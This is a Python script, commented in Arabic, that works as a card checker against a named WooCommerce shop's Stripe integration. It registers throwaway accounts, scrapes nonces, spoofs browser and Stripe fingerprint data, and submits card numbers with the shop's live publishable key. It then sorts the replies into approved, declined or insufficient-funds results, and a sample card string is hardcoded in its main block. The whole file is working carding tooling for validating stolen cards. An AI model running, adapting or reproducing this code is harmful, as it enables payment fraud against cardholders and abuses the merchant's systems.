import requests
from user_agent import generate_user_agent
import re
import random
import string
import uuid
import time

def Stripe1(ccx):
    """
    فحص بطاقة على simplesympathy.com (Stripe - Auth - Register with email only)
    ccx: رقم|شهر|سنة|cvv
    """
    try:
        # ===== تجزئة البطاقة =====
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy
        
        n = n.replace(" ", "")
        
        user = generate_user_agent()
        r = requests.Session()
        site_url = "https://simplesympathy.com"
        
        # ===== pk_live و stripe_account الثابتين =====
        STATIC_PK_LIVE = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
        STATIC_STRIPE_ACCOUNT = "acct_1LcEM42HIqGSNrpO"
        
        # ===== 1. فتح صفحة الحساب =====
        headers = {
            'authority': 'simplesympathy.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': f'{site_url}/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        response = r.get(f'{site_url}/my-account/', headers=headers)
        
        # استخراج register nonce
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
        if not reg:
            return "❌ Register nonce not found"
        reg = reg.group(1)
        
        # ===== 2. تسجيل حساب جديد (إيميل فقط) =====
        email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
        password = f"Pass{random.randint(1000,9999)}"
        
        headers = {
            'authority': 'simplesympathy.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site_url,
            'referer': f'{site_url}/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        r.post(f'{site_url}/my-account/', data=data, headers=headers)
        
        # ===== 3. فتح صفحة إضافة البطاقة =====
        headers = {
            'authority': 'simplesympathy.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': f'{site_url}/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        response = r.get(f'{site_url}/my-account/add-payment-method/', headers=headers)
        
        # ===== استخراج pk_live =====
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
        if pk_live:
            pk_live = pk_live.group(1)
        else:
            pk_live = STATIC_PK_LIVE
        
        # ===== استخراج stripe_account =====
        stripe_account = re.search(r'(acct_[A-Za-z0-9_-]+)', response.text)
        if stripe_account:
            stripe_account = stripe_account.group(1)
        else:
            stripe_account = STATIC_STRIPE_ACCOUNT
        acct = f'&_stripe_account={stripe_account}'
        
        # ===== البحث عن AJAX nonce بطرق متعددة =====
        addnonce = None
        
        # الطريقة 1: البحث عن _ajax_nonce في form
        match = re.search(r'name="_ajax_nonce"\s+value="([^"]+)"', response.text)
        if match:
            addnonce = match.group(1)
        
        # الطريقة 2: البحث عن createAndConfirmSetupIntentNonce
        if not addnonce:
            match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
            if match:
                addnonce = match.group(1)
        
        # الطريقة 3: البحث عن createSetupIntentNonce
        if not addnonce:
            match = re.search(r'"createSetupIntentNonce":"([^"]+)"', response.text)
            if match:
                addnonce = match.group(1)
        
        # الطريقة 4: البحث عن add_card_nonce
        if not addnonce:
            match = re.search(r'"add_card_nonce":"([^"]+)"', response.text)
            if match:
                addnonce = match.group(1)
        
        # الطريقة 5: البحث عن أي nonce بطول 10 أحرف (أول nonce)
        if not addnonce:
            all_nonces = re.findall(r'nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', response.text)
            if all_nonces:
                addnonce = all_nonces[0]
        
        if not addnonce:
            return "❌ AJAX nonce not found"
        
        # ===== 4. جلب stripe identifiers =====
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        response = r.post('https://m.stripe.com/6', headers=headers, data='')
        try:
            detet = response.json()
            guid = detet.get('guid', str(uuid.uuid4()))
            muid = detet.get('muid', str(uuid.uuid4()))
            sid = detet.get('sid', str(uuid.uuid4()))
        except:
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
        
        # ===== 5. إرسال البطاقة إلى Stripe =====
        client_session_id = str(uuid.uuid4())
        elements_session_config_id = str(uuid.uuid4())
        times = random.randint(10000, 99999)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10090&billing_details[address][country]=US&billing_details[name]=+&billing_details[email]={email}&payment_user_agent=stripe.js%2F8da149ee39%3B+stripe-js-v3%2F8da149ee39%3B+payment-element%3B+deferred-intent&referrer={site_url}&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}{acct}&_stripe_version=2024-06-20'
        
        response = r.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, headers=headers)
        
        try:
            resp_json = response.json()
            if 'id' not in resp_json:
                error_msg = resp_json.get('error', {}).get('message', 'Unknown')
                return f"❌ Stripe Error: {error_msg}"
            payment_id = resp_json['id']
        except Exception as e:
            return f"❌ Could not create payment method: {str(e)}"
        
        # ===== 6. تأكيد setup intent =====
        headers = {
            'authority': 'simplesympathy.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url,
            'referer': f'{site_url}/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'create_setup_intent',
            'wcpay-payment-method': payment_id,
            '_ajax_nonce': addnonce,
            'wcpay-fraud-prevention-token': '',
        }
        
        response = r.post(f'{site_url}/wp-admin/admin-ajax.php', data=data, headers=headers)
        text = response.text
        
        # ===== 7. تحليل النتيجة =====
        if 'card was declined' in text.lower():
            return '❌ The card was declined.'
        elif 'your card could not be set up' in text.lower():
            return '❌ Your card could not be set up for future usage.'
        elif 'your card number is incorrect' in text.lower():
            return '❌ Card number is incorrect.'
        elif 'duplicate card exists' in text.lower():
            return '✅ Approved (Duplicate)'
        elif 'insufficient funds' in text.lower():
            return '💰 Insufficient Funds'
        elif 'risk_threshold' in text.lower():
            return '⚠️ Risk Threshold'
        elif '"success":true' in text or 'success' in text.lower():
            return '✅ Approved'
        else:
            try:
                error_msg = response.json().get('data', {}).get('error', {}).get('message', '')
                if error_msg:
                    return f'❌ {error_msg}'
            except:
                pass
            return '❌ Declined'
        
    except Exception as e:
        return f'❌ Error: {str(e)}'


if __name__ == '__main__':
    test_card = "5294158321468738|12|2026|904"
    result = Stripe1(test_card)
    print(f'\n📇 Card: {test_card}\n📊 Result: {result}')